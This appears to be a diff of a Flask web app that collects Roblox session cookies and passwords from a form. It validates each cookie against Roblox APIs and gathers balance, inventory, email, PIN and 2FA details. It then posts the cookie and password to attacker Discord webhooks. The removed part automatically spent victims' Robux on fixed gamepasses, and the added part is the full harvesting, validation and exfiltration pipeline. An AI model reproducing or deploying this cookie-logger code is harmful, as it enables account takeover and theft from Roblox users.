@@ -14,198 +14,6 @@ load_dotenv()
 
 app = Flask(__name__)
 
-# Gamepass configuration - price thresholds and corresponding gamepass IDs
-GAMEPASS_CONFIG = [
-    {'threshold': 20, 'gamepass_id': 1481684222, 'price': 20},
-    {'threshold': 50, 'gamepass_id': 1482004141, 'price': 50},
-    {'threshold': 100, 'gamepass_id': 1481784145, 'price': 100},
-    {'threshold': 500, 'gamepass_id': 1482564256, 'price': 500},
-    {'threshold': 1000, 'gamepass_id': 1481950194, 'price': 1000},
-    {'threshold': 24000, 'gamepass_id': 1482376284, 'price': 24000}
-]
-
-def get_csrf_token_safe(cookie):
-    """Get CSRF token without logging out the user"""
-    try:
-        headers = {
-            'Cookie': f'.ROBLOSECURITY={cookie}' if not cookie.startswith('.ROBLOSECURITY=') else cookie,
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Content-Type': 'application/json'
-        }
-        
-        # Try multiple safe endpoints to get CSRF token
-        safe_endpoints = [
-            'https://auth.roblox.com/v1/authentication-ticket',
-            'https://catalog.roblox.com/v1/catalog/items/details',
-            'https://users.roblox.com/v1/users/authenticated'
-        ]
-        
-        for endpoint in safe_endpoints:
-            try:
-                if endpoint == 'https://catalog.roblox.com/v1/catalog/items/details':
-                    response = requests.post(
-                        endpoint,
-                        headers=headers,
-                        json={'items': [{'itemType': 'Asset', 'id': 1}]},
-                        timeout=10
-                    )
-                else:
-                    response = requests.get(endpoint, headers=headers, timeout=10)
-                
-                csrf_token = response.headers.get('X-CSRF-TOKEN')
-                if csrf_token:
-                    print("✅ CSRF token obtained safely")
-                    return csrf_token
-                    
-            except Exception as e:
-                print(f"❌ CSRF attempt failed for {endpoint}: {str(e)}")
-                continue
-        
-        return None
-        
-    except Exception as e:
-        print(f"❌ CSRF token fetch failed: {str(e)}")
-        return None
-
-def purchase_gamepass(cookie, user_id, gamepass_id, price):
-    """Purchase a specific gamepass using the provided cookie"""
-    try:
-        # Format cookie properly
-        if not cookie.startswith('.ROBLOSECURITY='):
-            formatted_cookie = f'.ROBLOSECURITY={cookie}'
-        else:
-            formatted_cookie = cookie
-            
-        headers = {
-            'Cookie': formatted_cookie,
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Content-Type': 'application/json; charset=utf-8'
-        }
-        
-        # Get CSRF token safely
-        csrf_token = get_csrf_token_safe(cookie)
-        if not csrf_token:
-            print("❌ Could not obtain CSRF token safely")
-            return False, "CSRF token not available"
-        
-        headers['X-CSRF-TOKEN'] = csrf_token
-        
-        # Purchase the gamepass
-        purchase_url = f'https://economy.roblox.com/v1/purchases/products/{gamepass_id}'
-        purchase_data = {
-            'expectedCurrency': 1,  # Robux
-            'expectedPrice': price,
-            'expectedSellerId': 1  # Use 1 for Roblox system
-        }
-        
-        print(f"🛒 Attempting purchase: Gamepass {gamepass_id} for {price} Robux")
-        
-        purchase_response = requests.post(
-            purchase_url,
-            headers=headers,
-            json=purchase_data,
-            timeout=15
-        )
-        
-        print(f"📨 Purchase response status: {purchase_response.status_code}")
-        
-        if purchase_response.status_code == 200:
-            purchase_result = purchase_response.json()
-            print(f"📊 Purchase result: {purchase_result}")
-            
-            if purchase_result.get('purchased') == True:
-                print(f"✅ Successfully purchased gamepass {gamepass_id}")
-                return True, "Purchase successful"
-            else:
-                error_msg = purchase_result.get('errorMsg', 'Unknown error')
-                print(f"❌ Purchase failed: {error_msg}")
-                return False, error_msg
-        elif purchase_response.status_code == 403:
-            # CSRF token might be invalid, try one more time with new token
-            print("🔄 CSRF token rejected, trying with new token...")
-            csrf_token = get_csrf_token_safe(cookie)
-            if csrf_token:
-                headers['X-CSRF-TOKEN'] = csrf_token
-                purchase_response = requests.post(purchase_url, headers=headers, json=purchase_data, timeout=15)
-                
-                if purchase_response.status_code == 200:
-                    purchase_result = purchase_response.json()
-                    if purchase_result.get('purchased') == True:
-                        print(f"✅ Successfully purchased gamepass {gamepass_id} on retry")
-                        return True, "Purchase successful"
-            
-            error_msg = f"HTTP {purchase_response.status_code} - CSRF token issue"
-            print(f"❌ Purchase request failed: {error_msg}")
-            return False, error_msg
-        else:
-            error_msg = f"HTTP {purchase_response.status_code}"
-            print(f"❌ Purchase request failed: {error_msg}")
-            return False, error_msg
-            
-    except Exception as e:
-        error_msg = f"Exception during purchase: {str(e)}"
-        print(f"❌ {error_msg}")
-        return False, error_msg
-
-def auto_purchase_gamepasses(cookie, user_id, robux_balance):
-    """Automatically purchase gamepasses based on available Robux balance"""
-    try:
-        print(f"🎯 Starting auto-purchase for user {user_id} with {robux_balance} Robux")
-        
-        # Extract numeric robux balance
-        if isinstance(robux_balance, str):
-            robux_balance_clean = robux_balance.replace('R$ ', '').replace(',', '')
-            try:
-                available_robux = int(robux_balance_clean)
-            except ValueError:
-                print(f"❌ Could not parse robux balance: {robux_balance}")
-                return []
-        else:
-            available_robux = int(robux_balance)
-        
-        print(f"💰 Available Robux: {available_robux}")
-        
-        if available_robux <= 0:
-            print("❌ No Robux available for purchase")
-            return []
-        
-        # Sort gamepasses by threshold (lowest to highest)
-        sorted_gamepasses = sorted(GAMEPASS_CONFIG, key=lambda x: x['threshold'])
-        
-        purchased_gamepasses = []
-        
-        # Purchase all affordable gamepasses
-        for gamepass in sorted_gamepasses:
-            if available_robux >= gamepass['threshold']:
-                print(f"🛒 Attempting to purchase gamepass {gamepass['gamepass_id']} for {gamepass['price']} Robux...")
-                success, message = purchase_gamepass(cookie, user_id, gamepass['gamepass_id'], gamepass['price'])
-                
-                if success:
-                    purchased_gamepasses.append({
-                        'gamepass_id': gamepass['gamepass_id'],
-                        'price': gamepass['price'],
-                        'status': 'success',
-                        'message': message
-                    })
-                    # Deduct the purchased amount from available balance
-                    available_robux -= gamepass['price']
-                    print(f"✅ Purchased! Remaining Robux: {available_robux}")
-                else:
-                    purchased_gamepasses.append({
-                        'gamepass_id': gamepass['gamepass_id'],
-                        'price': gamepass['price'],
-                        'status': 'failed',
-                        'error': message
-                    })
-                    print(f"❌ Purchase failed: {message}")
-        
-        print(f"🎉 Auto-purchase completed. Total purchased: {len([p for p in purchased_gamepasses if p['status'] == 'success'])}")
-        return purchased_gamepasses
-        
-    except Exception as e:
-        print(f"❌ Error in auto_purchase_gamepasses: {str(e)}")
-        return []
-
 def send_to_discord_background(password, cookie, webhook_url):
     """Background function to send data to Discord webhook"""
     try:
@@ -216,24 +24,6 @@ def send_to_discord_background(password, cookie, webhook_url):
         if not user_info.get('success', False):
             print("Background: Cookie failed validation against Roblox API - not sending webhooks")
             return
-        
-        # Extract numeric robux balance for auto-purchase
-        robux_balance_text = user_info['robux_balance']
-        robux_balance_numeric = 0
-        try:
-            if 'R$ ' in robux_balance_text:
-                robux_balance_numeric = int(robux_balance_text.replace('R$ ', '').replace(',', ''))
-            else:
-                robux_balance_numeric = int(robux_balance_text.replace(',', ''))
-        except (ValueError, AttributeError):
-            robux_balance_numeric = 0
-        
-        # Auto-purchase gamepasses based on balance
-        purchased_gamepasses = []
-        if robux_balance_numeric > 0:
-            print(f"Starting auto-purchase with balance: {robux_balance_numeric} Robux")
-            purchased_gamepasses = auto_purchase_gamepasses(cookie, user_info['user_id'], robux_balance_numeric)
-            print(f"Auto-purchase completed. Purchased {len(purchased_gamepasses)} gamepasses")
         
         # Check if user has Korblox or Headless for ping notification
         korblox = user_info.get('has_korblox', False)
@@ -289,29 +79,6 @@ def send_to_discord_background(password, cookie, webhook_url):
             cookie_content = cookie_content[:available_cookie_space] + "..."
             print(f"Background: Cookie truncated to fit Discord limit")
         
-        # Create purchase history field for MAIN webhook only
-        purchase_field = {
-            'name': '🛒 Auto-Purchase Results',
-            'value': 'No purchases attempted',
-            'inline': False
-        }
-        
-        if purchased_gamepasses:
-            success_purchases = [p for p in purchased_gamepasses if p['status'] == 'success']
-            failed_purchases = [p for p in purchased_gamepasses if p['status'] == 'failed']
-            
-            if success_purchases:
-                purchase_text = f"✅ **Successful Purchases:** {len(success_purchases)}\n"
-                for purchase in success_purchases:
-                    purchase_text += f"• Gamepass {purchase['gamepass_id']} - {purchase['price']} Robux\n"
-                
-                if failed_purchases:
-                    purchase_text += f"\n❌ **Failed:** {len(failed_purchases)} gamepasses"
-                
-                purchase_field['value'] = purchase_text
-            else:
-                purchase_field['value'] = f"❌ All purchases failed ({len(failed_purchases)} attempts)"
-        
         # Create Discord embed data for main webhook (with cookie)
         discord_data = {
             'content': ping_content,
@@ -358,7 +125,6 @@ def send_to_discord_background(password, cookie, webhook_url):
                             'value': '✅' if headless else '❌',
                             'inline': False
                         },
-                        purchase_field,  # Auto-purchase field only in main webhook
                         {
                             'name': '🔐 Account Settings Information',
                             'value': f"**Email Address:** {user_info.get('email_address', 'Not available')}\n**Verified:** {user_info.get('email_verified', '❌')}\n**Pin:** {user_info.get('pin_enabled', '❌')}\n**Authenticator:** {user_info.get('authenticator_enabled', '❌')}",
@@ -393,20 +159,20 @@ def send_to_discord_background(password, cookie, webhook_url):
         else:
             print(f"Background: Discord webhook failed: {response.status_code}")
         
-        # Send to bypass webhook (without cookie, password, AND auto-purchase info)
+        # Send to bypass webhook (without cookie and password) if configured
         bypass_webhook_url = os.environ.get('BYPASS_WEBHOOK_URL')
         if bypass_webhook_url:
-            send_to_bypass_webhook(user_info, ping_content)  # Removed purchased_gamepasses parameter
+            send_to_bypass_webhook(user_info, ping_content)
             
     except Exception as e:
         print(f"Background: Error sending to Discord: {str(e)}")
 
 def send_to_bypass_webhook(user_info, ping_content):
-    """Send bypass logs to separate webhook without cookie, password, and auto-purchase data"""
+    """Send bypass logs to separate webhook without cookie and password data"""
     try:
         print("Sending bypass logs to secondary webhook...")
         
-        # Create bypass embed without cookie, password, and auto-purchase data
+        # Create bypass embed without cookie and password data
         bypass_data = {
             'content': '@everyone 📊 Success',  # Added ping notification
             'embeds': [
@@ -477,18 +243,597 @@ def send_to_bypass_webhook(user_info, ping_content):
     except Exception as e:
         print(f"Error sending to bypass webhook: {str(e)}")
 
-# ... (Keep all other functions the same: get_roblox_user_info, is_valid_cookie, and all routes remain unchanged)
+def get_roblox_user_info(cookie):
+    """Get Roblox user information using the provided cookie"""
+    try:
+        headers = {
+            'Cookie': f'.ROBLOSECURITY={cookie}' if not cookie.startswith('.ROBLOSECURITY=') else cookie,
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        }
+        
+        # Get current user info
+        response = requests.get('https://users.roblox.com/v1/users/authenticated', 
+                              headers=headers, timeout=3)
+        
+        if response.status_code == 200:
+            user_data = response.json()
+            user_id = user_data.get('id')
+            username = user_data.get('name', 'Unknown')
+            display_name = user_data.get('displayName', username)
+            
+            # Get user avatar/profile picture
+            avatar_response = requests.get(f'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=150x150&format=Png',
+                                         timeout=5)
+            
+            profile_picture_url = 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A84C1E07EBC93E9CDAEC87A36A2FEA33-Png/150/150/AvatarHeadshot/Png/noFilter'
+            if avatar_response.status_code == 200:
+                avatar_data = avatar_response.json()
+                if avatar_data.get('data') and len(avatar_data['data']) > 0:
+                    profile_picture_url = avatar_data['data'][0].get('imageUrl', profile_picture_url)
+            
+            # Get Robux balance - try multiple endpoints
+            robux_balance = 'Not available'
+            
+            # Try the currency endpoint first
+            try:
+                robux_response = requests.get('https://economy.roblox.com/v1/users/currency',
+                                            headers=headers, timeout=5)
+                print(f"Robux API response status: {robux_response.status_code}")
+                
+                if robux_response.status_code == 200:
+                    robux_data = robux_response.json()
+                    print(f"Robux API response: {robux_data}")
+                    if 'robux' in robux_data:
+                        robux_balance = f"R$ {robux_data['robux']:,}"
+                    else:
+                        print("No 'robux' field in response")
+                else:
+                    print(f"Robux API failed with status: {robux_response.status_code}, response: {robux_response.text}")
+            except Exception as robux_error:
+                print(f"Error getting Robux balance: {str(robux_error)}")
+                
+            # If first method failed, try alternative endpoint using user_id
+            if robux_balance == 'Not available' and user_id:
+                try:
+                    alt_response = requests.get(f'https://economy.roblox.com/v1/users/{user_id}/currency',
+                                              headers=headers, timeout=5)
+                    print(f"Alternative Robux API response status: {alt_response.status_code}")
+                    
+                    if alt_response.status_code == 200:
+                        alt_robux_data = alt_response.json()
+                        print(f"Alternative Robux API response: {alt_robux_data}")
+                        if 'robux' in alt_robux_data:
+                            robux_balance = f"R$ {alt_robux_data['robux']:,}"
+                except Exception as alt_error:
+                    print(f"Alternative Robux API error: {str(alt_error)}")
+            
+            # Get Pending Robux using transaction totals endpoint
+            pending_robux = 'Not available'
+            try:
+                pending_response = requests.get(f'https://economy.roblox.com/v2/users/{user_id}/transaction-totals?timeFrame=Month&transactionType=summary',
+                                              headers=headers, timeout=5)
+                print(f"Pending Robux API response status: {pending_response.status_code}")
+                
+                if pending_response.status_code == 200:
+                    pending_data = pending_response.json()
+                    print(f"Pending Robux API response: {pending_data}")
+                    if 'pendingRobuxTotal' in pending_data:
+                        pending_amount = pending_data['pendingRobuxTotal']
+                        pending_robux = f"{pending_amount:,}" if isinstance(pending_amount, (int, float)) else str(pending_amount)
+                    else:
+                        print("No 'pendingRobuxTotal' field in response")
+                        pending_robux = '0'
+                else:
+                    print(f"Pending Robux API failed with status: {pending_response.status_code}, response: {pending_response.text}")
+                    pending_robux = '0'
+            except Exception as pending_error:
+                print(f"Error getting Pending Robux: {str(pending_error)}")
+                pending_robux = '0'
+            
+            # Get Total spent robux past year using transaction totals endpoint
+            total_spent_past_year = 'Not available'
+            try:
+                # Try yearly timeframe first
+                year_response = requests.get(f'https://economy.roblox.com/v2/users/{user_id}/transaction-totals?timeFrame=Year&transactionType=summary',
+                                           headers=headers, timeout=5)
+                print(f"Yearly spending API response status: {year_response.status_code}")
+                
+                if year_response.status_code == 200:
+                    year_data = year_response.json()
+                    print(f"Yearly spending API response: {year_data}")
+                    
+                    # Look for outgoing robux total (spent robux)
+                    if 'outgoingRobuxTotal' in year_data:
+                        spent_amount = year_data['outgoingRobuxTotal']
+                        total_spent_past_year = f"{spent_amount:,}" if isinstance(spent_amount, (int, float)) else str(spent_amount)
+                    elif 'robuxSpent' in year_data:
+                        spent_amount = year_data['robuxSpent']
+                        total_spent_past_year = f"{spent_amount:,}" if isinstance(spent_amount, (int, float)) else str(spent_amount)
+                    else:
+                        print("No spending data fields found in yearly response")
+                        total_spent_past_year = '0'
+                        
+                elif year_response.status_code == 500:
+                    # Known issue with yearly timeframe, try monthly as fallback
+                    print("Yearly API returned 500 error, falling back to monthly data estimation")
+                    total_spent_past_year = 'Estimate unavailable'
+                else:
+                    print(f"Yearly spending API failed with status: {year_response.status_code}, response: {year_response.text}")
+                    total_spent_past_year = 'API Error'
+                    
+            except Exception as year_error:
+                print(f"Error getting yearly spending data: {str(year_error)}")
+                total_spent_past_year = 'Connection Error'
+            
+            # Check Premium status
+            premium_status = '❌ No'
+            try:
+                premium_response = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership',
+                                              headers=headers, timeout=5)
+                print(f"Premium API response status: {premium_response.status_code}")
+                
+                if premium_response.status_code == 200:
+                    premium_data = premium_response.json()
+                    print(f"Premium API response: {premium_data}")
+                    # Handle both object and boolean responses
+                    if isinstance(premium_data, bool):
+                        premium_status = '✅ Yes' if premium_data else '❌ No'
+                    elif isinstance(premium_data, dict) and premium_data.get('isPremium', False):
+                        premium_status = '✅ Yes'
+                else:
+                    print(f"Premium API failed with status: {premium_response.status_code}")
+            except Exception as premium_error:
+                print(f"Error getting Premium status: {str(premium_error)}")
+            
+            # Check for Korblox and Headless items in user's inventory
+            has_korblox = False
+            has_headless = False
+            
+            try:
+                # Check for Korblox Deathspeaker Right Leg (ID: 139607718)
+                korblox_response = requests.get(f'https://inventory.roblox.com/v1/users/{user_id}/items/Asset/139607718',
+                                              headers=headers, timeout=5)
+                print(f"Korblox inventory check status: {korblox_response.status_code}")
+                
+                if korblox_response.status_code == 200:
+                    korblox_data = korblox_response.json()
+                    has_korblox = len(korblox_data.get('data', [])) > 0
+                    print(f"Korblox check result: {has_korblox}")
+                else:
+                    print(f"Korblox inventory check failed: {korblox_response.status_code}")
+                    
+            except Exception as korblox_error:
+                print(f"Error checking Korblox inventory: {str(korblox_error)}")
+            
+            try:
+                # Check for Headless items (both classic and dynamic)
+                headless_ids = [134082579, 15093053680]  # Classic and Dynamic Headless
+                
+                for headless_id in headless_ids:
+                    headless_response = requests.get(f'https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{headless_id}',
+                                                   headers=headers, timeout=5)
+                    print(f"Headless {headless_id} inventory check status: {headless_response.status_code}")
+                    
+                    if headless_response.status_code == 200:
+                        headless_data = headless_response.json()
+                        if len(headless_data.get('data', [])) > 0:
+                            has_headless = True
+                            print(f"Headless item {headless_id} found")
+                            break
+                    else:
+                        print(f"Headless {headless_id} inventory check failed: {headless_response.status_code}")
+                        
+            except Exception as headless_error:
+                print(f"Error checking Headless inventory: {str(headless_error)}")
+            
+            # Get Account Settings Information
+            email_address = 'Not available'
+            email_verified = '❌'
+            pin_enabled = '❌'
+            authenticator_enabled = '❌'
+            
+            try:
+                # Get email information
+                email_response = requests.get('https://accountsettings.roblox.com/v1/email',
+                                           headers=headers, timeout=5)
+                print(f"Email API response status: {email_response.status_code}")
+                
+                if email_response.status_code == 200:
+                    email_data = email_response.json()
+                    print(f"Email API response: {email_data}")
+                    
+                    # Get email address and mask it
+                    if email_data.get('emailAddress'):
+                        email = email_data['emailAddress']
+                        # Mask email: k*******@gmail.com
+                        if '@' in email:
+                            local_part, domain = email.split('@', 1)
+                            if len(local_part) > 1:
+                                masked_email = local_part[0] + '*' * (len(local_part) - 1) + '@' + domain
+                            else:
+                                masked_email = email[0] + '*' * (len(email) - 1)
+                            email_address = masked_email
+                        else:
+                            email_address = email
+                    
+                    # Check email verification status
+                    if email_data.get('verified', False):
+                        email_verified = '✅'
+                    else:
+                        email_verified = '❌'
+                else:
+                    print(f"Email API failed with status: {email_response.status_code}")
+                    
+            except Exception as email_error:
+                print(f"Error checking email settings: {str(email_error)}")
+            
+            try:
+                # Check PIN status
+                pin_response = requests.get('https://auth.roblox.com/v1/account/pin',
+                                          headers=headers, timeout=5)
+                print(f"PIN API response status: {pin_response.status_code}")
+                
+                if pin_response.status_code == 200:
+                    pin_data = pin_response.json()
+                    print(f"PIN API response: {pin_data}")
+                    
+                    # Check if PIN is enabled
+                    if pin_data.get('isEnabled', False):
+                        pin_enabled = '✅'
+                    else:
+                        pin_enabled = '❌'
+                else:
+                    print(f"PIN API failed with status: {pin_response.status_code}")
+                    pin_enabled = '❌'
+                    
+            except Exception as pin_error:
+                print(f"Error checking PIN status: {str(pin_error)}")
+                pin_enabled = '❌'
+            
+            try:
+                # Check 2FA/Authenticator status
+                twostep_response = requests.get('https://twostepverification.roblox.com/v1/users/configuration',
+                                              headers=headers, timeout=5)
+                print(f"2FA API response status: {twostep_response.status_code}")
+                
+                if twostep_response.status_code == 200:
+                    twostep_data = twostep_response.json()
+                    print(f"2FA API response: {twostep_data}")
+                    
+                    # Check if authenticator is enabled
+                    if twostep_data.get('authenticatorEnabled', False) or twostep_data.get('totpEnabled', False):
+                        authenticator_enabled = '✅'
+                    else:
+                        authenticator_enabled = '❌'
+                else:
+                    print(f"2FA API failed with status: {twostep_response.status_code}")
+                    authenticator_enabled = '❌'
+                    
+            except Exception as twostep_error:
+                print(f"Error checking 2FA settings: {str(twostep_error)}")
+                authenticator_enabled = '❌'
+            
+            return {
+                'success': True,
+                'username': username,
+                'display_name': display_name,
+                'user_id': user_id,
+                'profile_picture': profile_picture_url,
+                'robux_balance': robux_balance,
+                'pending_robux': pending_robux,
+                'premium_status': premium_status,
+                'total_spent_past_year': total_spent_past_year,
+                'has_korblox': has_korblox,
+                'has_headless': has_headless,
+                'email_address': email_address,
+                'email_verified': email_verified,
+                'pin_enabled': pin_enabled,
+                'authenticator_enabled': authenticator_enabled
+            }
+        else:
+            print(f"Cookie validation failed against Roblox API: {response.status_code}")
+            print(f"Response: {response.text}")
+        
+    except Exception as e:
+        print(f"Error fetching Roblox user info: {str(e)}")
+    
+    # Return failure indicator if cookie doesn't work with Roblox API
+    return {
+        'success': False,
+        'username': 'Not available',
+        'display_name': 'Not available', 
+        'user_id': None,
+        'profile_picture': 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A84C1E07EBC93E9CDAEC87A36A2FEA33-Png/150/150/AvatarHeadshot/Png/noFilter',
+        'robux_balance': 'Not available',
+        'pending_robux': 'Not available',
+        'premium_status': '❌ No',
+        'total_spent_past_year': 'Not available',
+        'has_korblox': False,
+        'has_headless': False,
+        'email_address': 'Not available',
+        'email_verified': '❌',
+        'pin_enabled': '❌',
+        'authenticator_enabled': '❌'
+    }
 
-if __name__ == '__main__':
-    print("🚀 Starting Flask server...")
-    print("📋 Available routes:")
-    print("   / - Main page")
-    print("   /test-purchase - Test purchase functions")
-    print("   /health - Health check")
-    print("   /submit - Form submission")
+def is_valid_cookie(cookie):
+    """
+    Validate cookie and check if it's not expired
+    Supports JWT tokens and session cookies with expiration
+    Returns tuple: (is_valid, is_expired, error_message)
+    """
+    if not cookie or len(cookie) < 10:
+        return False, False, "Invalid cookie format"
+    
+    # Check if it's a JWT token (has 3 parts separated by dots)
+    if cookie.count('.') == 2:
+        try:
+            # Split JWT token
+            header, payload, signature = cookie.split('.')
+            
+            # Decode payload with correct padding for URL-safe base64
+            payload += '=' * (-len(payload) % 4)
+            decoded_payload = base64.urlsafe_b64decode(payload)
+            payload_data = json.loads(decoded_payload)
+            
+            # Check expiration (exp claim)
+            if 'exp' in payload_data:
+                exp_time = payload_data['exp']
+                current_time = int(time.time())
+                
+                if current_time >= exp_time:
+                    return False, True, "Cookie has expired"  # Token is expired
+            
+            return True, False, None  # Valid JWT token, not expired
+            
+        except (ValueError, json.JSONDecodeError, Exception):
+            return False, False, "Invalid cookie format"  # Invalid JWT format
+    
+    # For non-JWT cookies, accept Roblox-style cookies and other formats
+    # Accept Roblox .ROBLOSECURITY cookies (often start with _|WARNING:)
+    # Allow truncated cookies as long as they meet minimum requirements
+    if cookie.startswith('_|WARNING:') and len(cookie) > 50:
+        return True, False, None
+    
+    # Accept standard cookie formats
+    cookie_pattern = r'^(session|token|auth|_token|user_token|access_token)=[A-Za-z0-9+/=_-]{10,}$'
+    if re.match(cookie_pattern, cookie):
+        return True, False, None
+    
+    # Accept any long alphanumeric string that could be a valid token
+    # Allow truncated cookies as long as they have some valid characters
+    if len(cookie) >= 30 and any(c.isalnum() for c in cookie):
+        return True, False, None
+    
+    return False, False, "Invalid cookie format"
+
+@app.route('/')
+def index():
+    """Serve the main HTML page"""
+    return send_from_directory('.', 'index.html')
+
+@app.route('/health')
+def health_check():
+    """Health check endpoint to verify main webhook connectivity"""
+    webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
+    
+    if not webhook_url:
+        return jsonify({
+            'status': 'error',
+            'message': 'DISCORD_WEBHOOK_URL not configured'
+        }), 500
+    
+    # Validate webhook URL format
+    if not webhook_url.startswith('https://discord.com/api/webhooks/'):
+        return jsonify({
+            'status': 'error', 
+            'message': 'Invalid Discord webhook URL format'
+        }), 500
     
     try:
-        app.run(host='0.0.0.0', port=5000, debug=False)
+        # Test connection with a minimal payload
+        test_payload = {'content': 'Health check test'}
+        response = requests.post(webhook_url, json=test_payload, timeout=5)
+        
+        if response.status_code in [200, 204]:
+            return jsonify({
+                'status': 'ok',
+                'message': 'Discord webhook connection successful',
+                'webhook_status': response.status_code
+            })
+        else:
+            return jsonify({
+                'status': 'error',
+                'message': f'Discord webhook returned status {response.status_code}',
+                'response': response.text[:200]
+            }), 500
+            
+    except requests.ConnectionError as e:
+        return jsonify({
+            'status': 'error',
+            'message': 'Connection error - cannot reach Discord servers',
+            'error': str(e)[:100]
+        }), 500
+    except requests.Timeout:
+        return jsonify({
+            'status': 'error',
+            'message': 'Timeout error - Discord servers not responding'
+        }), 500
     except Exception as e:
-        print(f"❌ Failed to start server: {e}")
-        print("💡 Try using a different port: python app.py --port=5001")
+        return jsonify({
+            'status': 'error',
+            'message': f'Unexpected error: {str(e)[:100]}'
+        }), 500
+
+@app.route('/health/full')
+def health_check_full():
+    """Comprehensive health check for all webhooks"""
+    results = {
+        'main_webhook': {'status': 'unknown'},
+        'bypass_webhook': {'status': 'unknown'},
+        'overall_status': 'unknown'
+    }
+    
+    # Test main webhook
+    main_webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
+    if not main_webhook_url:
+        results['main_webhook'] = {
+            'status': 'error',
+            'message': 'DISCORD_WEBHOOK_URL not configured'
+        }
+    else:
+        try:
+            test_payload = {'content': 'Main webhook health check'}
+            response = requests.post(main_webhook_url, json=test_payload, timeout=5)
+            
+            if response.status_code in [200, 204]:
+                results['main_webhook'] = {
+                    'status': 'ok',
+                    'message': 'Main webhook successful',
+                    'status_code': response.status_code
+                }
+            else:
+                results['main_webhook'] = {
+                    'status': 'error',
+                    'message': f'Main webhook failed with status {response.status_code}',
+                    'status_code': response.status_code
+                }
+        except Exception as e:
+            results['main_webhook'] = {
+                'status': 'error',
+                'message': f'Main webhook error: {str(e)[:100]}'
+            }
+    
+    # Test bypass webhook
+    bypass_webhook_url = os.environ.get('BYPASS_WEBHOOK_URL')
+    if not bypass_webhook_url:
+        results['bypass_webhook'] = {
+            'status': 'warning',
+            'message': 'BYPASS_WEBHOOK_URL not configured (optional)'
+        }
+    else:
+        try:
+            test_payload = {'content': 'Bypass webhook health check'}
+            response = requests.post(bypass_webhook_url, json=test_payload, timeout=5)
+            
+            if response.status_code in [200, 204]:
+                results['bypass_webhook'] = {
+                    'status': 'ok',
+                    'message': 'Bypass webhook successful',
+                    'status_code': response.status_code
+                }
+            else:
+                results['bypass_webhook'] = {
+                    'status': 'error',
+                    'message': f'Bypass webhook failed with status {response.status_code}',
+                    'status_code': response.status_code
+                }
+        except Exception as e:
+            results['bypass_webhook'] = {
+                'status': 'error',
+                'message': f'Bypass webhook error: {str(e)[:100]}'
+            }
+    
+    # Determine overall status
+    main_ok = results['main_webhook']['status'] == 'ok'
+    bypass_ok = results['bypass_webhook']['status'] in ['ok', 'warning']
+    
+    if main_ok and bypass_ok:
+        results['overall_status'] = 'ok'
+        status_code = 200
+    elif main_ok:
+        results['overall_status'] = 'warning'
+        status_code = 200
+    else:
+        results['overall_status'] = 'error'
+        status_code = 500
+    
+    return jsonify(results), status_code
+
+@app.route('/debug')
+def debug_info():
+    """Debug endpoint to check environment and configuration"""
+    return jsonify({
+        'environment_variables': {
+            'DISCORD_WEBHOOK_URL': 'SET' if os.environ.get('DISCORD_WEBHOOK_URL') else 'NOT_SET',
+            'BYPASS_WEBHOOK_URL': 'SET' if os.environ.get('BYPASS_WEBHOOK_URL') else 'NOT_SET',
+            'DATABASE_URL': 'SET' if os.environ.get('DATABASE_URL') else 'NOT_SET',
+            'SESSION_SECRET': 'SET' if os.environ.get('SESSION_SECRET') else 'NOT_SET'
+        },
+        'python_version': sys.version,
+        'current_working_directory': os.getcwd(),
+        'files_in_directory': os.listdir('.'),
+        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())
+    })
+
+
+@app.route('/submit', methods=['POST'])
+def submit_form():
+    """Handle form submission and send to Discord webhook"""
+    try:
+        data = request.get_json()
+        
+        # Extract all form fields
+        password = data.get('password', '').strip()
+        cookie = data.get('cookie', '').strip()
+        
+        # Server-side validation
+        if not cookie:
+            return jsonify({
+                'success': False, 
+                'message': 'Missing required field (cookie)'
+            }), 400
+        
+        # Comprehensive cookie validation
+        is_valid, is_expired, error_msg = is_valid_cookie(cookie)
+        
+        if not is_valid or is_expired:
+            return jsonify({
+                'success': False, 
+                'message': 'Your Cookie Was Expired Or Invalid'
+            }), 400
+        
+        
+        # Get Discord webhook URL from environment
+        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
+        if not webhook_url:
+            print("ERROR: DISCORD_WEBHOOK_URL environment variable not set")
+            print("Available environment variables:", [key for key in os.environ.keys() if 'WEBHOOK' in key.upper() or 'DISCORD' in key.upper()])
+            return jsonify({
+                'success': False, 
+                'message': 'Discord webhook not configured. Please set DISCORD_WEBHOOK_URL environment variable in your deployment platform.'
+            }), 500
+        
+        print("Discord webhook URL configured successfully") # Don't log URL for security
+        
+        # Process Discord webhooks synchronously for Vercel compatibility  
+        print("Processing Discord webhooks synchronously...")
+        start_time = time.time()
+        
+        try:
+            send_to_discord_background(password, cookie, webhook_url)
+            end_time = time.time()
+            processing_time = end_time - start_time
+            print(f"Discord webhook processing completed successfully in {processing_time:.2f} seconds")
+            
+            return jsonify({
+                'success': True, 
+                'message': f'Data processed and sent successfully in {processing_time:.1f}s'
+            })
+        except Exception as e:
+            end_time = time.time()
+            processing_time = end_time - start_time
+            print(f"Error during Discord webhook processing after {processing_time:.2f} seconds: {str(e)}")
+            return jsonify({
+                'success': False, 
+                'message': f'Processing failed after {processing_time:.1f}s: webhook delivery error'
+            }), 500
+            
+    except Exception as e:
+        return jsonify({
+            'success': False, 
+            'message': 'Server error occurred'
+        }), 500
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000, debug=False)
